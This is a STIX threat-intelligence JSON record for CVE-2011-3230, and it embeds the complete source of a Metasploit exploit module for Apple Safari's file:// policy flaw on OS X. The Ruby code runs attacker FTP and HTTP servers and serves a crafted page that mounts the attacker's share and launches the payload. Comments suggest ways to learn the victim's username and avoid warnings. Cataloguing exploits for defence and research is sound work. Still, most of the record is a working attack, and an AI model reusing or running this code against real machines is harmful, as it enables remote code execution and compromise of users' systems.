{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6b95503f-8af0-45bf-a9c7-12a5f510ad18",
    "created": "2024-08-14T16:34:32.279718Z",
    "modified": "2024-08-14T16:34:32.279722Z",
    "name": "\"Apple Safari file:// Arbitrary Code Execution\"",
    "description": " This module exploits a vulnerability found in Apple Safari on OS X platform.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/osx/browser/safari_file_policy.rb",
            "external_id": "safari_file_policy.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-3230"
        },
        {
            "source_name": "reference",
            "url": "http://vttynotes.blogspot.com/2011/10/cve-2011-3230-launch-any-file-path-from.html#comments"
        },
        {
            "source_name": "reference",
            "url": "http://support.apple.com/kb/HT5000"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::FtpServer\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Apple Safari file:// Arbitrary Code Execution\",\n      'Description'    => %q{\n          This module exploits a vulnerability found in Apple Safari on OS X platform.\n        A policy issue in the handling of file:// URLs may allow arbitrary remote code\n        execution under the context of the user.\n\n          In order to trigger arbitrary remote code execution, the best way seems to\n        be opening a share on the victim machine first (this can be SMB/WebDav/FTP, or\n        a file format that OS X might automount), and then execute it in /Volumes/[share].\n        If there's some kind of bug that leaks the victim machine's current username,\n        then it's also possible to execute the payload in /Users/[username]/Downloads/,\n        or else bruteforce your way to getting that information.\n\n          Please note that non-java payloads (*.sh extension) might get launched by\n        Xcode instead of executing it, in that case please try the Java ones instead.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Aaron Sigel',  # Initial discovery\n          'sinn3r',       # Metasploit (also big thanks to HD, and bannedit)\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2011-3230' ],\n          [ 'OSVDB', '76389' ],\n          [ 'URL', 'http://vttynotes.blogspot.com/2011/10/cve-2011-3230-launch-any-file-path-from.html#comments' ],\n          [ 'URL', 'http://support.apple.com/kb/HT5000' ]\n        ],\n      'Payload'        =>\n        {\n          'BadChars'    => \"\",\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => \"none\",\n        },\n      'Platform'       => %w{ java osx unix },\n      'Arch'           => [ ARCH_CMD, ARCH_JAVA ],\n      'Targets'        =>\n        [\n          [ 'Safari 5.1 on OS X',           {} ],\n          [ 'Safari 5.1 on OS X with Java', {} ]\n        ],\n      'Privileged'     => true,\n      'DisclosureDate' => '2011-10-12',  #Blog date\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new(\"URIPATH\", [false, 'The URI to use for this exploit (default is random)']),\n        OptPort.new('SRVPORT',   [true, \"The local port to use for the FTP server (Do not change)\", 21 ]),\n        OptPort.new('HTTPPORT',  [true, \"The HTTP server port\", 80])\n      ])\n  end\n\n\n  #\n  # Start the FTP aand HTTP server\n  #\n  def exploit\n    # The correct extension name is necessary because that's how the LauncherServices\n    # determines how to open the file.\n    ext = (target.name =~ /java/i) ? '.jar' : '.sh'\n    @payload_name = Rex::Text.rand_text_alpha(4 + rand(16)) + ext\n\n    # Start the FTP server\n    start_service()\n    print_status(\"Local FTP: #{lookup_lhost}:#{datastore['SRVPORT']}\")\n\n    # Create our own HTTP server\n    # We will stay in this functino until we manually terminate execution\n    start_http()\n  end\n\n\n  #\n  # Lookup the right address for the client\n  #\n  def lookup_lhost(c=nil)\n    # Get the source address\n    if datastore['SRVHOST'] == '0.0.0.0'\n      Rex::Socket.source_address( c || '50.50.50.50')\n    else\n      datastore['SRVHOST']\n    end\n  end\n\n\n  #\n  # Override the client connection method and\n  # initialize our payload\n  #\n  def on_client_connect(c)\n    r = super(c)\n    @state[c][:payload] = regenerate_payload(c).encoded\n    r\n  end\n\n\n  #\n  # Handle FTP LIST request (send back the directory listing)\n  #\n  def on_client_command_list(c, arg)\n    conn = establish_data_connection(c)\n    if not conn\n      c.put(\"425 Can't build data connection\\r\\n\")\n      return\n    end\n\n    print_status(\"Data connection setup\")\n    c.put(\"150 Here comes the directory listing\\r\\n\")\n\n    print_status(\"Sending directory list via data connection\")\n    month_names = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec']\n    m = month_names[Time.now.month-1]\n    d = Time.now.day\n    y = Time.now.year\n\n    dir = \"-rwxr-xr-x 1 ftp ftp              #{@state[c][:payload].length.to_s} #{m} #{d}  #{y} #{@payload_name}\\r\\n\"\n    conn.put(dir)\n    conn.close\n\n    print_status(\"Directory sent ok\")\n    c.put(\"226 Transfer ok\\r\\n\")\n\n    return\n  end\n\n\n  #\n  # Handle the FTP RETR request. This is where we transfer our actual malicious payload\n  #\n  def on_client_command_retr(c, arg)\n    conn = establish_data_connection(c)\n    if not conn\n      c.put(\"425 can't build data connection\\r\\n\")\n      return\n    end\n\n    print_status(\"Connection for file transfer accepted\")\n    c.put(\"150 Connection accepted\\r\\n\")\n\n    # Send out payload\n    conn.put(@state[c][:payload])\n    conn.close\n    return\n  end\n\n\n  #\n  # Handle the HTTP request and return a response.  Code borrorwed from:\n  # msf/core/exploit/http/server.rb\n  #\n  def start_http(opts={})\n    # Ensure all dependencies are present before initializing HTTP\n    use_zlib\n\n    comm = datastore['ListenerComm']\n    if (comm.to_s == \"local\")\n      comm = ::Rex::Socket::Comm::Local\n    else\n      comm = nil\n    end\n\n    # Default the server host / port\n    opts = {\n      'ServerHost' => datastore['SRVHOST'],\n      'ServerPort' => datastore['HTTPPORT'],\n      'Comm'       => comm\n    }.update(opts)\n\n    # Start a new HTTP server\n    @http_service = Rex::ServiceManager.start(\n      Rex::Proto::Http::Server,\n      opts['ServerPort'].to_i,\n      opts['ServerHost'],\n      datastore['SSL'],\n      {\n        'Msf'        => framework,\n        'MsfExploit' => self,\n      },\n      opts['Comm'],\n      datastore['SSLCert']\n    )\n\n    @http_service.server_name = datastore['HTTP::server_name']\n\n    # Default the procedure of the URI to on_request_uri if one isn't\n    # provided.\n    uopts = {\n      'Proc' => Proc.new { |cli, req|\n          on_request_uri(cli, req)\n        },\n      'Path' => resource_uri\n    }.update(opts['Uri'] || {})\n\n    proto = (datastore[\"SSL\"] ? \"https\" : \"http\")\n    print_status(\"Using URL: #{proto}://#{opts['ServerHost']}:#{opts['ServerPort']}#{uopts['Path']}\")\n\n    if (opts['ServerHost'] == '0.0.0.0')\n      print_status(\" Local IP: #{proto}://#{Rex::Socket.source_address('1.2.3.4')}:#{opts['ServerPort']}#{uopts['Path']}\")\n    end\n\n    # Add path to resource\n    @service_path = uopts['Path']\n    @http_service.add_resource(uopts['Path'], uopts)\n\n    # As long as we have the http_service object, we will keep the ftp server alive\n    while @http_service\n      select(nil, nil, nil, 1)\n    end\n  end\n\n\n  #\n  # Kill HTTP/FTP (shut them down and clear resources)\n  #\n  def cleanup\n    super\n\n    # clear my resource, deregister ref, stop/close the HTTP socket\n    begin\n      @http_service.remove_resource(datastore['URIPATH'])\n      @http_service.deref\n      @http_service = nil\n    rescue\n    end\n  end\n\n\n  #\n  # Ensures that gzip can be used.  If not, an exception is generated.  The\n  # exception is only raised if the DisableGzip advanced option has not been\n  # set.\n  #\n  def use_zlib\n    if !Rex::Text.zlib_present? && datastore['HTTP::compression']\n      fail_with(Failure::Unknown, \"zlib support was not detected, yet the HTTP::compression option was set.  Don't do that!\")\n    end\n  end\n\n\n  #\n  # Returns the configured (or random, if not configured) URI path\n  #\n  def resource_uri\n    path = datastore['URIPATH'] || rand_text_alphanumeric(8+rand(8))\n    path = '/' + path if path !~ /^\\//\n    datastore['URIPATH'] = path\n    return path\n  end\n\n\n  #\n  # Handle HTTP requets and responses\n  #\n  def on_request_uri(cli, request)\n    agent = request.headers['User-Agent']\n\n    if agent !~ /Macintosh; Intel Mac OS X/ or agent !~ /Version\\/5\\.\\d Safari\\/(\\d+)\\.(\\d+)/\n      print_error(\"Unsupported target: #{agent}\")\n      send_response(cli, 404, \"Not Found\", \"<h1>404 - Not Found</h1>\")\n      return\n    end\n\n    html = <<-HTML\n    <html>\n    <head>\n    <base href=\"file://\">\n    <script>\n    function launch() {\n      document.location = \"/Volumes/#{lookup_lhost}/#{@payload_name}\";\n    }\n\n    function share() {\n      document.location = \"ftp://anonymous:anonymous@#{lookup_lhost}/\";\n      setTimeout(\"launch()\", 2000);\n    }\n\n    share();\n    </script>\n    </head>\n    <body>\n    </body>\n    </html>\n    HTML\n\n    send_response(cli, 200, 'OK', html)\n  end\n\n\n  #\n  # Create an HTTP response and then send it\n  #\n  def send_response(cli, code, message='OK', html='')\n    proto = Rex::Proto::Http::DefaultProtocol\n    res = Rex::Proto::Http::Response.new(code, message, proto)\n    res['Content-Type'] = 'text/html'\n    res.body = html\n\n    cli.send_response(res)\n  end\nend\n\n=begin\n- Need to find a suitable payload that can be executed without warning.\n  Certain executables cannot be executed due to permission issues. A jar file doesn't have this\n  problem, but we still get a \"Are you sure?\" warning before it can be executed.\n- Allow user-specified port to automount the share\n- Allow ftp USERNAME/PASSWORD (optional)\n=end\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2011-10-12,  #Blog date",
    "x_mitre_platforms": [
        "%w{ java osx unix }"
    ]
}